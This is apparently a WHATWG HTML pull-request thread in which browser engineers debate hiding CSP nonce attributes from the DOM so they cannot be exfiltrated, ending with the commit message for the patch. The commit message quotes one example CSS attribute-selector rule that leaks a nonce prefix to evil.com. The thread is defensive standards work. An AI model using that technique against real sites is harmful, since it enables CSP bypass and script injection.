body: Would a cleaner model not make this solely a parser change (parser sets the internal slot, doesn't append a content attribute) and then not have any other processing model observe or modify the nonce content attribute?

We could certainly do it that way. That said, I think @arturjanc, et al are currently propagating the nonce value in a backwards-compatible way via code like the following, which would break if the content attribute wasn't present (e.g. the `<script>` was inserted via `'strict-dynamic'`'s automatic nonce propagation):

    var nonce = document.querySelector('script[nonce]').nonce ||
                document.querySelector('script[nonce]').getAttribute('nonce');

I suppose they could instead grab the nonce by walking through all the `<script>` elements, checking each for a nonce value? That seems convoluted, but maybe putting the burden on the developer in that way is the right thing to do.
I've updated this patch after thinking about things a little bit more, and I'll put together some tests today in hopes of explaining how I think things would work.

Thoughts?

I'd like to ship something to close this hole in the relatively near future. I think this approach feels pretty reasonable, seems like a good balance between developer ergonomics and security, and folks on @arturjanc's team at Google are ~confident in their experiments on top of Chrome's experimental implementation. 

/ccing the list of folks from the related issue @arturjanc, @mikispag, @lweichselbaum, @mozfreddyb, @ckerschb, @dveditz, @hillbrad, @devd, @johnwilander, and @teddink in the hopes of soliciting more opinions.
So an implication here is that nonces will not appear anywhere other than in `nonce=""` attributes, correct? Not in `srcset="foo 2x nonce(...)"`, not in CSS `url("foo", nonce "...")`, and so on?

@zcorpan: The approach here only applies to `nonce` attributes in markup. If someone does the work to expose fetch attributes to other kinds of syntax, then we'd probably want to talk about the way that data is exposed to side-channels.

Do you have a PR for SVG as well? Blink's [SVGScriptElement.idl](https://cs.chromium.org/chromium/src/third_party/WebKit/Source/core/svg/SVGScriptElement.idl) points to https://w3c.github.io/webappsec/specs/content-security-policy/#script-src-the-nonce-attribute, but that now redirects to a spec that doesn't define anything for SVG. https://svgwg.org/svg2-draft/single-page.html also doesn't do it.

To make sure I'm following, most of this patch is disappearing in favor of https://github.com/whatwg/dom/pull/436, right? With the main things remaining being the deletion of nonce from link/style/script.

Should cloning preserve this nonce internal slot?  This is more relevant to style than script, obviously.  Would affect cases when people fetch a DOM subtree via XHR and then clone some subtree of the responseXML.

Have we considered the interaction with pages doing `innerHTML += stuff`?  Seems like that would make nonce'd stylesheets disappear...

I'd really like to take a step back and understand the threat model here.  Is it (basing this off the blink-dev thread) that people can maybe inject `<style>` elements and sites can't use CSP to forbid those because there is no way to do so without forbidding `style` attributes too?  Maybe CSP should be able to forbid one without the other, since they have different attack profiles.  You can't exfiltrate attribute values via `style` attributes, for example...

> Should cloning preserve this nonce internal slot? This is more relevant to style than script, obviously. Would affect cases when people fetch a DOM subtree via XHR and then clone some subtree of the responseXML.

Yes, for `<template>` if for no other reason. I believe that's already covered in this patch via the "cloning steps" bit on line 6888 (as well as in the DOM variant that it sounds like you want us to drop (and I can live with that)).

> Have we considered the interaction with pages doing innerHTML += stuff? Seems like that would make nonce'd stylesheets disappear...

That's a good point. FWIW, I can live with breaking this, given the intersection of developers likely to use CSP nonces and developers likely to `innerHTML +=` their document, but I'm open to alternatives.

> I'd really like to take a step back and understand the threat model here. Is it (basing this off the blink-dev thread) that people can maybe inject <style> elements and sites can't use CSP to forbid those because there is no way to do so without forbidding style attributes too? Maybe CSP should be able to forbid one without the other, since they have different attack profiles. You can't exfiltrate attribute values via style attributes, for example...

@arturjanc can probably give you more context than you prefer to have on this topic. His claim is both that dealing with style at scale is hard (with Google-specific anecdata to back that up), and that `style-src` shouldn't be necessary to have a reasonable guarantee of protection via `script-src`. Ensuring that the nonce is exposed only to script goes some way towards providing that baseline.

That said, I agree with you that there are relevant distinctions between attribute values and inline style. Allowing distinct targeting of each category via CSP might alleviate some of the deployment pain that folks feel, but it's not at all clear to me that that's the core of the issues Artur's team has run into at Google.

Another thing to consider here is editors.  The fact that the DOM doesn't actually store the right state anymore makes writing editors a lot trickier...

In general, it seems to me that auto-disappearing attributes will lead to a long tail of things that break because no one expects that to happen, because it never happens right now....

Maybe the right answer is simply that any use of nonces in CSP should disable `<style>` that's not explicitly whitelisted via nonces (but NOT disable `style` attributes)?   Not sure how much that would break in practice; it depends on how widely nonce is deployed...

I like the idea of being able to distinguish between `style` attributes and `<style>` elements in CSP because they differ significantly in their capabilities, i.e. the latter can use selectors, media queries, `@import`, etc and is much more powerful for an attacker. Something like `style-src 'nonce-foo' 'unsafe-inline-attributes-only'` could be a useful primitive.

I'm less excited about forcing developers to restrict styles just so they can prevent script execution if they use CSP with nonces, for the reasons mentioned by Mike. It's worth talking about, but I'd propose that it's 
somewhat tangential to this change; it would require large modifications to existing applications which use CSP and would take a long time, whereas the fix discussed here wouldn't require such refactoring.

@bzbarsky The most readable explanation of the threat model is https://sirdarckcat.blogspot.ch/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html Essentially, an injection which can be triggered by an attacker without reloading the page (which happens frequently with DOM XSS) allows the attacker to exfiltrate a script nonce and then re-use the exfiltrated value to inject arbitrary scripts, even if the application has an otherwise safe CSP policy. The attacks mentioned in the post all rely on the fact that you can exfiltrate data from the DOM without the capability to execute scripts, most commonly by using CSS selectors. However, I don't think CSS is the only way to accomplish this, or at the very least it's not particularly future-proof -- there are features in other web formats such as SVG which can manipulate attributes of other DOM nodes (e.g. `<set>`) which, if the script nonce is accessible to the DOM, could have a similar effect. An attacker with a markup injection has a lot of attack surface to poke at to try and discover the nonce; preventing the `nonce` attribute from being accessible to the DOM seems like a fairly robust solution to such problems.

> Maybe the right answer is simply that any use of nonces in CSP should disable <style> that's not explicitly whitelisted via nonces (but NOT disable style attributes)? Not sure how much that would break in practice; it depends on how widely nonce is deployed...

As one data point, it would likely break most of Google ;-)  Many applications care about script injection but not style injection, so they set `script-src` but not `style-src` in CSP; consequently they do not add nonces to `<style>` and `<link#rel=stylesheet>` elements -- this is essentially what https://csp.withgoogle.com/docs/index.html recommends to developers.

I'm sympathetic to the attack surface argument, but I still think the auto-disappearing behavior being proposed is going to cause problems for all sorts of tools by violating a very basic invariant of how the DOM works...  It seems like we're working around a mistake in how we designed CSP's nonce interaction (a mistake that is hard to fix now due to existing deployments) by breaking the DOM's invariants in ways that will cause problems for everyone other than CSP.  :(

So. Where do we go from here? It sounds like we agree that the threat is a reasonable one to defend against, and it sounds like we agree that it would be hard to modify the existing behavior of `script-src 'nonce-whatever'` due to existing deployment.

Given that, I'm tempted to say that the strange behavior of the `nonce` attribute is a wart we can live with, especially if we limit it to the specific types of elements that have special behavior (as this patch does).

If that's unacceptable, then perhaps introducing a broader concept, similar to the `sec-` header prefix would be reasonable? `nonce` can continue to behave just like any other attribute, but `__totally-hidden-and-secret__nonce` would be magical? That seems even uglier, but would be less likely to crop up in ways that would break invariants that existing code relies upon?

Maybe we should explore restricting stylesheets independently from style attributes more?

But also, I don't think this quite breaks an invariant in the DOM, since anyone could have insertion behavior defined that modifies attributes; though with mutation observers that change would happen a little later of course. We're not actually modifying what `setAttribute()` does here.

```
SELECT COUNT(*) AS num, REGEXP_EXTRACT(LOWER(body), r'<([a-z][a-z0-9-]*)(?:\s[^>]+)?\s+nonce\s*=') AS tag
FROM [httparchive:har.2017_03_15_chrome_requests_bodies]
GROUP BY tag
ORDER BY num DESC
```
```
Row	num	tag	 
1	17096802	null	 
2	6793	script	 
3	58	style	 
4	4	link	 
5	2	img
```

> Maybe we should explore restricting stylesheets independently from style attributes more?

I think this is probably worth doing, but orthogonal to the question here. That is, it doesn't sound like changing this behavior to more specifically target kinds of style would not make it easier for @arturjanc to teach the properties he's responsible for about `style-src`.

> But also, I don't think this quite breaks an invariant in the DOM, since anyone could have insertion behavior defined that modifies attributes; though with mutation observers that change would happen a little later of course. We're not actually modifying what setAttribute() does here.

This is probably confusing, as the initial proposal has shifted as we've gone. The current proposal in this PR is more narrowly scoped, and, as @annevk notes, doesn't affect `setAttribute()` but only the insertion steps. It seems targeted enough to be unlikely to cause issues in real sites, as @zcorpan's analysis also seems to show.

>> Maybe we should explore restricting stylesheets independently from style attributes more?

> I think this is probably worth doing, but orthogonal to the question here.

I just filed https://github.com/w3c/webappsec-csp/issues/202 for this because it's a valuable idea, but I also don't see it as a fix for the current problem (because of the practical difficulty of refactoring applications to use it, the time needed for it to be implemented in user-agents, and the fact that it's a less robust fix because there can conceivably be non-CSS ways to achieve the same effect). Essentially, if we care about the security problem of nonce exfiltration from the DOM, which makes CSP policies based on nonces all but ineffective, then it's probably not great to gate it on such a big change which requires opt-in and refactoring of most applications that use CSP nonces.

@mikewest Since I admit I also lost of track of the implementation details of the proposal we're discussing here, could you briefly summarize it or perhaps point to an existing overview? (Ideally, readable by an HTML neophyte :)

> @mikewest Since I admit I also lost of track of the implementation details of the proposal we're discussing here, could you briefly summarize it or perhaps point to an existing overview? (Ideally, readable by an HTML neophyte :)

The tests at https://github.com/w3c/web-platform-tests/pull/5423 are probably the simplest way to see what I think this patch does. In a nutshell: when an element is inserted into a document, we move its nonce to an internal slot, and expose that slot's value via the `nonce` IDL attribute. Otherwise, no change to existing behavior.

> since anyone could have insertion behavior defined that modifies attributes

Really?  How?  I think you're making assumptions about the contexts this is happening in; see below.

> though with mutation observers that change would happen a little later of course.

You can't have mutation observers in a meaningful way on the responseXML of an XHR, or the return value of DOMParser.parseFromString.  You don't get access to it until it's all done parsing.

So right now a script can assume that if it has data in string form and parses it to produce a DOM, the DOM will be what it's expected to be.  The proposed changes violate this.

I still don't see how an editor (which obviously needs to parse and then reserialize) can work with the proposed changes.  Likewise for server-side processing pipelines that parse, then modify the DOM, then have to serialize back to pass things on to the next stage (which may be the browser).

Note that these last concerns apply to anything that disappears attributes, no matter what they're named, by the way; they would equally apply to `__totally-hidden-and-secret__nonce`.

Part of the problem there is that the proposal is trying to target a fairly narrow thing, but using an extremely broad approach that affects all HTML consumers everywhere, per the letter of the spec as it would be with the proposed changes applied.

Thanks, and I apologize for promptly forgetting about that point the first time you made it. I agree that applying this so broadly is bad and I also don't see a reasonable way to make it more narrow, since that just leads to a very fragile system.

Well, we could restrict the behavior to only certain documents (e.g. only documents with a Window associated or something)...  But I agree that it makes it harder to reason about from a security perspective, and in particular makes it harder to tell whether we've fixed the exfiltration issues we're worried about.

I can't comment about elegance/sanity on the HTML side, but from the security perspective, all of the following restrictions should be fine:
- Applying this only to elements which can have a `nonce` attribute (`<script>`, `<link>`, `<style>`),
- Applying only to elements attached to the document
- Applying only in documents which set a CSP (or maybe only with a CSP which defines a nonce)

Would any of these restrictions be helpful here?

Applying only to documents which set a CSP might help some with my concerns about this affecting random DOM-based workflows.

We would need to have a very clear definition of what "set a CSP" means, especially because this state can change at any time (and indeed can happen in a random DOM-based workflow!) due to `<meta http-equiv="Content-Security-Policy">` and because even for HTTP headers it's not clear to me whether there's interop here (e.g. consider an XHR response that sends CSP headers; does that "set a CSP"?).

> We would need to have a very clear definition of what "set a CSP" means, especially because this state can change at any time (and indeed can happen in a random DOM-based workflow!) due to <meta http-equiv="Content-Security-Policy"> and because even for HTTP headers it's not clear to me whether there's interop here

I hope we could use the definition from the CSP spec which says that a policy can apply to a Window or WorkerGlobalScope (less relevant here, since workers don't have a DOM): https://www.w3.org/TR/CSP/#framework-policy  So perhaps we could define it as "If the global object has a non-empty CSP list..." (https://www.w3.org/TR/CSP/#html-integration) or something like this?

One caveat is that if the only CSP policy is served via `<meta>` and there is a ScriptElement instantiated before the `<meta>` element, its `nonce` attribute would still be accessible and wouldn't be covered by this change. This isn't a problem in practice, though, because almost all users of CSP with script nonces set the policy via a response header, and the CSP spec asks for policies delivered in `<meta>` to be set as early as possible.

> (e.g. consider an XHR response that sends CSP headers; does that "set a CSP"?)

By the logic above it shouldn't, which makes intuitive sense to me.

> This isn't a problem in practice

To be clear, that's not a valid argument when figuring out a formal definition for a feature. We'll have to define how it works. But non-empty CSP list or has an associated Window object (different from a relevant global object) could both work. It still seems rather strange though.

(I have not forgotten this conversation, but I'm OOO until Tuesday. So. In general, I'd like to find a narrow solution to the problem. I think we can do so in a way that doesn't break the web. I look forward to continuing the discussion next week. :) )

After talking a bit with @arturjanc yesterday, I see a few ways in which we can modify the proposal which might make folks happier or sadder, depending on what they care about.

Reading through the description above, it sounds like the fundamental objection from @bzbarsky is the breaking of expectations around parsing HTML, and round-tripping elements through various kinds of edits. I actually agree with this critique; we've chosen a non-obvious way to solve the problem of non-script-based side-channels, and it has side-effects which would be nice to avoid.

As a strawman, consider a different approach altogether: let's say we added a new attribute prefix which banned access via the same set of non-script mechanisms that we address by clearing the content attribute's value. That is (assuming we ran with `sec-*` to match the HTTP header carveout in Fetch), then the element `<script sec-nonce=whatever>` would be parsed just as it is today, generating an element with a `sec-nonce` content attribute with a value of "whatever", but we'd ensure that the CSS attribute selector `[sec-nonce]` would not match any element. `getAttribute('sec-nonce')` would return "whatever", `setAttribute('sec-nonce', '...')` would change the content attribute's value, and other script-driven interfaces would likewise continue to have the same behavior they have today.

In a number of ways, this feels like a _better_ solution: it's cheaper to implement than reserving a slot on every `HTML*Element` object, it doesn't affect editors/round-tripping, it's more targeted than poking at `Element`, it's not nonce-specific, it's easy to explain, and so on.

It has a pretty big disadvantage from a security perspective, however, in that it requires us to exhaustively enumerate and address all the side-channels that would be affected. CSS attribute selectors are obvious, but I don't have much confidence that they're the only mechanism. It wouldn't surprise me at all to find bits of SVG that allowed the same kinds of queries, for example, and I worry that this kind of approach would turn into a drawn-out game of whack-a-mole.

With that in mind, the patch we're discussing takes a different approach, nuking the whole content attribute from orbit. This approach does have collateral damage. Given the usage numbers @zcorpan noted above, I suspect that the practical impact of an `nonce` not round-tripping would be fairly limited, but I totally buy that it would be confusing for developers.

I guess I'm left with a few questions:

1.  Would a narrower version of this patch that only applied the insertion behavior in some cases be more or less reasonable? I can imagine a few variants of this ("any policy at all", "a policy that sets a nonce", "a policy that sets a nonce that actually matches the value of the attribute", excluding `<meta>` from each of the above, etc), and while it's appealing from a risk-aversion standpoint, it's not clear to me that the level of interop risk actually justifies the additional complexity.

2.  Would an explicit opt-in that applied the insertion behavior only when a specific flag was set in a page's policy be more reasonable?  That is, `script-src 'nonce-whatever'` would work just as today, but `script-src 'nonce-whatever' 'and-also-clear-the-content-attribute'` would clear the attribute on insertion. This is also appealing from a risk-aversion standpoint, but it would be unfortunate to require a CSP opt-in for something that seems necessary for CSP's efficacy.

3.  Are @arturjanc and I overestimating the risk associated with enumerating all entry points, today and in the future?

> Given the usage numbers @zcorpan noted above, I suspect that the practical impact of an nonce not round-tripping would be fairly limited

Just to be clear, the impact of the original proposal, as far as I can see, would be to break server-side workflows that involve parsing and serialization of any markup that contains `<script nonce>`, forever into the future.  I'm not sure how the usage numbers help with that in any way.  The modified proposals involving checks for there actually being a CSP that is being applied are much more reasonable.

> Would a narrower version of this patch that only applied the insertion behavior in some cases be more or less reasonable?

Yes, imo.  Per above, I think you're seriously misunderstanding the level of "interop risk" here with the original proposal.

The main difficulty with this approach, I think, is defining all the edge cases clearly so browsers agree on what "a CSP is applied" means.  It seems like we should be able to deal with that.

> Would an explicit opt-in that applied the insertion behavior only when a specific flag was set in a page's policy be more reasonable?

This actually has a noticeable drawback from my point of view: it gates parsing of the HTML on the results of parsing and evaluating the CSP bits.  I would probably prefer a "is there CSP?" check to this.

> Are @arturjanc and I overestimating the risk associated with enumerating all entry points

Probably not.  Remembering to check that all future features must not leak the values of the sec-* attributes via non-script means would be a pain; people would likely forget to check that.

> The main difficulty with this approach, I think, is defining all the edge cases clearly so browsers agree on what "a CSP is applied" means. It seems like we should be able to deal with that. Ok. Then let's take this route. I think this means: 1. Define something in CSP to allow us to determine whether a CSP list is noncey enough to trigger the behavior. I'm thinking something along the lines of: > ``` > A policy (|policy|) is said to contain a > nonce expression if the following steps return `true`: > > 1. For each |directive| in |policy|'s [=policy/directive set=]: > > 1. For each |expression| in |directive|'s [=directive/value=]: > > 1. If |expression| matches the `nonce-source` > grammar, return `true`. > > 2. Return `false`. > ``` That would cause the behavior change in the presence of `script-src 'nonce-whatever'`, but not `script-src https://whatever/`. 2. Change this PR to drop the `NonceableHTMLElement` bit, and apply the changes to `HTMLElement` instead. That is, when an `HTMLElement` becomes connected, we'd check it's shadow-including root's CSP list against the steps in 1 above before applying the new behavior. 3. Send a PR to SVG doing the same. For 1, we could also introduce something to exclude `` if you're interested in minimizing the runtime changes that could apply to a document. I don't have strong feelings about that bit. For 2 and 3, I guess we could also follow CSS's [`ElementCSSInlineStyle`](https://www.w3.org/TR/cssom-1/#the-elementcssinlinestyle-interface) example and define an interface in CSP that `HTMLElement` and `SVGElement` would implement, which might reduce duplication? I'm happy to do that however y'all like. WDYT?

> This actually has a noticeable drawback from my point of view: it gates parsing of the HTML on the results of parsing and evaluating the CSP bits. I would probably prefer a "is there CSP?" check to this.

I think limiting ourselves to HTTP-delivered policy takes care of this concern (or, rather, means that it's not a change from status quo): we already populate the document's CSP list when constructing the document, before we begin stuffing elements into it. We should already have the data we need by the time we start up the parser.

> we already populate the document's CSP list when constructing the document

Per spec, yes.  But how is it observable if an implementation does these in parallel?

> We should already have the data we need by the time we start up the parser.

Why?  The parser starts way before anything is "stuffed in the document", as you put it, and on a totally separate thread anyway.

Basically, you're introducing a parallelism-hostile synchronization point if you require a dependency on the CSP contents here.

For the other bits, I'm not quite clear on the exact proposal.  Is it that every single HTMLElement has to do work when connected to see whether it has a "nonce" attribute and if it does whether there's a particular CSP, and if so take action?

> Why? The parser starts way before anything is "stuffed in the document", as you put it, and on a totally separate thread anyway.

I'll look at Chrome's implementation tomorrow, but I'm fairly certain that:

1. We parse the policy in an HTTP response before we create a Document object in order to deal with `frame-ancestors` blocking the load entirely (and we're working on doing this even earlier in order to move `frame-ancestors` to the browser process), to gather sandboxing flags from `sandbox`, and set a few other things that would affect the preloader (like strict mixed content blocking).

2. We bind the parsed policy to the document (and apply the above settings) more or less directly after creation, and before we kick off parsing.

> Basically, you're introducing a parallelism-hostile synchronization point if you require a dependency on the CSP contents here.

That's a fair criticism. I think Chrome's implementation is unlikely to start parsing the HTML before we parse the policy to work out whether things like `frame-ancestors` or `sandbox` apply, but I agree that we should take a closer look to see whether or not we can allow that kind of optimization for other engines (Servo?) that might be ahead of us here.

Would you be happier if we just checked for the presence of a `Content-Security-Policy` response header in the response that's used to create the document (or the CSP list in replacement navigation cases, I suppose)?

> For the other bits, I'm not quite clear on the exact proposal. Is it that every single HTMLElement has to do work when connected to see whether it has a "nonce" attribute and if it does whether there's a particular CSP, and if so take action?

Yes. I think we'd want to structure it as a flag on the document that we'd set based upon the state of the CSP list (similar to the way we handle `sandbox`), but the element would need to check that flag when it becomes connected, and process its `nonce` element accordingly.

> I'll look at Chrome's implementation tomorrow

Chrome's implementation is very much not designed for parallelism, sorry.  ;)

> Would you be happier if we just checked for the presence of a Content-Security-Policy response header

Yes, probably.  What should happen for XHR?  I assume we'd only want to check for documents associated with a browsing context?

> > I'll look at Chrome's implementation tomorrow
>
> Chrome's implementation is very much not designed for parallelism, sorry. ;)

*sigh* But it has a beautiful personality!

> > Would you be happier if we just checked for the presence of a Content-Security-Policy response header
>
> Yes, probably.

Ok. That should be straightforward. Will you be happy if we set that flag during the "initialize a document's CSP list" algorithm (called from https://html.spec.whatwg.org/#initialise-the-document-object), or is there some spot earlier on that you'd prefer?

> What should happen for XHR? I assume we'd only want to check for documents associated with a browsing context?

That makes sense. So I guess we'd want to take action when an element [becomes browsing-context connected](https://html.spec.whatwg.org/#becomes-browsing-context-connected)?

> Will you be happy if we set that flag during the "initialize a document's CSP list" algorithm

I think that should be fine, yes.

> So I guess we'd want to take action when an element becomes browsing-context connected?

That seems plausible...

I've updated the PR, based on top of the CSP patch at https://github.com/w3c/webappsec-csp/pull/214. If this is more or less in line with what y'all are thinking, I'll update the tests in https://github.com/w3c/web-platform-tests/issues/5423 and send a similar PR over to the SVG folks.

(The SVG integration is why I kept `NoncedElement` as a separate interface, which should hopefully make the SVG change fairly trivial.)
I'm not going to get a chance to really look at this in detail until Monday at best.

Would you be able to take a look at this this week? I'd like to ship something in the relatively near future to give @arturjanc, et al some tools to defend against exfiltration. I think the broad strokes here are in line with what we've discussed... :)

So in particular, inserting a <link> into the DOM, then setting the nonce attr, then setting the href attr will NOT use the nonce with the above changes, but does use it per current spec.  Is that a purposeful change?

Apart from the details above, I can probably live with the overall shape of this solution.  But those details really need to be sorted out for this to be reasonably defined.

> Mutation events seem safe, given that they're triggered asynchronously.

You're confusing mutation observers (async) and mutation events (sync).  Mutation events are things like DOMAttrModified.

> Would it be better to just reach into the guts of the attribute node and change its value, bypassing these events entirely?

Well, the sane thing from my point of view would be to update the internal slot value immediately, so things that depend on it will work, but not change the actual attribute value until the point when CEReactions  would normally happen, or so...  That way you know things are in a stable state that script is allowed to run in by the time you're doing things that might run script.

> That seems more confusing than just treating them as separate things.

I'm honestly not sure which is more confusing, especially since we're changing the semantics of some existing code....

One thing that bothers me with the proposal as it stands is that given a node not in the DOM there's no simple way to ask it "what nonce will be used when you load?"  Neither `node.getAttribute("nonce")` nor `node.nonce` return that information alone, though I _think_ `node.getAttribute("nonce") || node.nonce` does.

> You mean something like the following?

Yes, or with `setAttribute("nonce", "yay")`, which today is equivalent.

> If so, no, it doesn't.

OK, so at least we won't be changing behavior here...  It's a bit sad that we have this bug in the platform already.  :(

> Would not execute, as the internal slot would be overwritten

Just to be clear, I am asking about the behavior authors would expect, not just the behavior the proposed spec produces, and about how well they match up with each other.  I understand the behavior the proposed spec produces.

Put another way, if right now a page does:

    var x = document.createElement('script');
    x.src = 'whatever.js';
    x.setAttribute('nonce', 'invalid');  // happens in some library that is producing your script tag
    x.nonce = 'nonceynonce'; // The actual nonce you want
    document.head.appendChild(x);

then the load will work.  With the proposed spec it will not work.  Should it continue working?

> > Would it be better to just reach into the guts of the attribute node and change its value, bypassing these events entirely?
>
> Well, the sane thing from my point of view would be to update the internal slot value immediately, so things that depend on it will work, but not change the actual attribute value until the point when CEReactions would normally happen, or so... How about something like:

```
Hide `nonce` content attribute values

Some [recent attacks on CSP][1] rely on the ability to exfiltrate
nonce data via various mechanisms that can read content attributes.
CSS selectors are the best example: through clever use of
prefix/postfix text matching selectors values can be sent out to an
attacker's server for reuse (e.g.,
`script[nonce=a] { background: url("https://evil.com/nonce?a");}`).

This patch mitigates the risk of this class of attack by hiding the
nonce value from elements' content attributes by moving the `nonce`
attributes into a new `NoncedElement` interface mixin, which is
included into `HTMLElement`. That mixin defines the following
behaviors for the `nonce` content attribute:

1.  When the `nonce` content attribute is set or changed, its new
    value is copied into a `[[CryptographicNonce]]` slot on the
    element.

2.  When a `NoncedElement` is inserted into a document which was
    delivered with a `Content-Security-Policy` header, the `nonce`
    content attribute is cleared out.

The `nonce` IDL attribute getter and setter now operate on the
`[[CryptographicNonce]]` slot's value rather than reflecting the
content attribute, meaning that the nonce value remains exposed
to script, but is opaque to non-script side-channels.

Likewise, the `[[CryptographicNonce]]` slot's value is used when
populating a request's cryptographic nonce metadata in order to
deliver the nonce to CSP for validation.

Tests: https://github.com/w3c/web-platform-tests/tree/master/content-security-policy/nonce-hiding

Closes #2369.

[1]: https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
```
